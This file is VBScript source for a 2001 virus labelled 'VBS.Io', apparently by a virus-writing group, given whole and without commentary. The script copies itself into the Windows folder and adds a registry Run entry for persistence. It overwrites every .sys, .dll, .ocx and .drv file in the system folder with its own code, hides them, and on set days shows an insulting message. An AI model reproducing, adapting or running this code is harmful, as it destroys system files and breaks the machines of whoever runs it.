'VBS.Io By Dr.T/BCVG 2001 
On Error Resume Next 
Dim fso, file, vbscopy, wscr, f, finee, ext, ap, s, dirwin, dirsys 
Set fso = CreateObject("Scripting.FileSystemObject") 
set file = fso.OpenTextFile(WScript.ScriptFullname,1) 
vbscopy=file.ReadAll 
Set dirwin = fso.GetSpecialFolder(0) 
Set dirsys = fso.GetSpecialFolder(1) 
Set c = fso.GetFile(WScript.ScriptFullName) 
c.Copy(dirwin &"\Command\MSNetLog.vbs") 
set regedit = createobject("WScript.Shell") 
regedit.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSNetLog",dirwin&"\Command\logMS.vbs" 
set f = fso.GetFolder(dirsys) 
set fc = f.Files 
for each finee in fc 
ext=fso.GetExtensionName(finee.path) 
ext=lcase(ext) 
s=lcase(finee.name) 
if (ext="sys") or (ext="dll") or (ext="ocx") or (ext="drv") then 
set ap=fso.OpenTextFile(finee.path,2,true) 
ap.write vbscopy 
ap.close 
set att=fso.GetFile(finee.path) 
att.attributes=att.attributes+2 
end if 
next 
if Day(Now) = 2 or Day(Now) = 10 or Day(Now) = 12 or Day(Now) = 16 or Day(Now) = 28 then 
MsgBox "Fermats Last Theorem THE PROOF : y^2 = ax^3 + bx^2 + cx + d is an elliptic curve, we need to prove that every elliptic curve is modular and it is very complex and since you were infected by PHP.IoBaracuda virus you are an idiot!! And  you will not understand the proof. Sorry", 16 
end if 
